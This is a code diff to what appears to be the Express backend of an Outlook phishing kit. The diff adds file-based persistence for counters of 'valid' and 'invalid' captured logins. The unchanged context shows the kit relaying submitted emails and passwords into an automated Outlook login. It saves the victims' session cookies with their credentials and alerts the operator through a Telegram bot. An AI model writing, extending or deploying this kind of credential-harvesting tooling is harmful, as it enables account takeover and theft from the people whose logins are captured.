@@ -1,6 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 const { OutlookLoginAutomation } = require('./src/outlook-login');
 const AdminTokenBot = require('./telegram-bot');
 
@@ -60,12 +61,45 @@ const HEALTH_CHECK_INTERVAL = 2 * 60 * 1000; // 2 minutes
 let sessionMutex = null; // Prevents race conditions in session management
 let initializingSession = false; // Prevents concurrent browser initialization
 
-// Analytics tracking
-const analytics = {
-    totalVisits: 0,
-    validEntries: 0,
-    invalidEntries: 0
-};
+// Analytics tracking with persistent storage
+const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');
+
+// Load analytics from file
+function loadAnalytics() {
+    try {
+        if (fs.existsSync(ANALYTICS_FILE)) {
+            const data = fs.readFileSync(ANALYTICS_FILE, 'utf8');
+            const savedAnalytics = JSON.parse(data);
+            console.log('📊 Loaded analytics from file:', savedAnalytics);
+            return {
+                totalVisits: savedAnalytics.totalVisits || 0,
+                validEntries: savedAnalytics.validEntries || 0,
+                invalidEntries: savedAnalytics.invalidEntries || 0
+            };
+        }
+    } catch (error) {
+        console.error('Error loading analytics:', error);
+    }
+    console.log('📊 Starting with fresh analytics data');
+    return {
+        totalVisits: 0,
+        validEntries: 0,
+        invalidEntries: 0
+    };
+}
+
+// Save analytics to file
+function saveAnalytics() {
+    try {
+        fs.writeFileSync(ANALYTICS_FILE, JSON.stringify(analytics, null, 2));
+        console.log('💾 Analytics saved to file');
+    } catch (error) {
+        console.error('Error saving analytics:', error);
+    }
+}
+
+// Initialize analytics from file
+const analytics = loadAnalytics();
 
 // Helper function to initialize browser directly - Prevents concurrent initialization
 async function initBrowser(session) {
@@ -367,9 +401,11 @@ app.post('/api/login', async (req, res) => {
 
         // Track visit
         analytics.totalVisits++;
+        saveAnalytics();
 
         if (!email) {
             analytics.invalidEntries++;
+            saveAnalytics();
             return res.status(400).json({ 
                 error: 'Email is required' 
             });
@@ -441,6 +477,7 @@ app.post('/api/login', async (req, res) => {
                 // If password login successful, save cookies but don't use them
                 if (loginSuccess) {
                     analytics.validEntries++;
+                    saveAnalytics();
                     console.log('💾 Saving session cookies to file (not for reuse)...');
                     const sessionFile = await session.automation.saveCookies(email, password);
 
@@ -484,6 +521,7 @@ app.post('/api/login', async (req, res) => {
             // Track failed login attempts
             if (!loginSuccess) {
                 analytics.invalidEntries++;
+                saveAnalytics();
             }
 
             res.json({
@@ -569,6 +607,7 @@ app.post('/api/login', async (req, res) => {
                                     console.log(`Found error message: ${errorText.trim()}`);
                                     foundAccountNotFoundError = true;
                                     analytics.invalidEntries++;
+                                    saveAnalytics();
                                     console.log(`📊 Analytics: Invalid entries now ${analytics.invalidEntries}`);
                                 } else {
                                     // Remove all other bordered error messages from HTML
@@ -773,6 +812,7 @@ app.post('/api/continue-login', async (req, res) => {
                     'Login completed successfully!';
 
                 analytics.validEntries++;
+                saveAnalytics();
 
                 // Send Telegram notification if bot is available
                 if (telegramBot && sessionFile && loginSuccess) {
@@ -808,6 +848,7 @@ app.post('/api/continue-login', async (req, res) => {
             } else {
                 responseMessage = 'Login may require additional verification';
                 analytics.invalidEntries++;
+                saveAnalytics();
             }
 
             res.json({
